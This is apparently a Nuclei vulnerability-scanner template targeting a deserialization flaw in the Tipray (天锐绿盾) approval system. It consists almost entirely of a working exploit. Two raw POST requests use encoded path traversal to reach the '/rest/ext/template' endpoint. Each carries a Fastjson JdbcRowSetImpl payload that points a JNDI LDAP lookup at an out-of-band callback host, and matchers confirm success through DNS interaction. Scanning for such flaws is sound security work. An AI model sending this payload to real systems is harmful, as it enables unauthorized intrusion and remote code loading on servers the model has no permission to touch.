id: poc-yaml-tipray-gsas-template-deserialize
info:
  name: 天锐绿盾审批系统 template 反序列化漏洞
  author: ProjectDiscoveryAI
  severity: critical
  tags: 反序列化,DNSLOG

variables:
  domain: "{{interactsh-url}}"

http:
  - raw:
      - |
        POST /trwfe/service/.%2E/rest/ext/template HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {
            "@type": "com.sun.rowset.JdbcRowSetImpl",
            "dataSourceName": "ldap://{{domain}}",
            "autoCommit": true
        }

      - |
        POST /trwfe/login.jsp/.%2e/rest/ext/template HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {
            "@type": "com.sun.rowset.JdbcRowSetImpl",
            "dataSourceName": "ldap://{{domain}}",
            "autoCommit": true
        }
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: body
        words:
          - "Internal server error"
          - "set property error"
      - type: word
        part: header
        words:
          - "application/json"
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
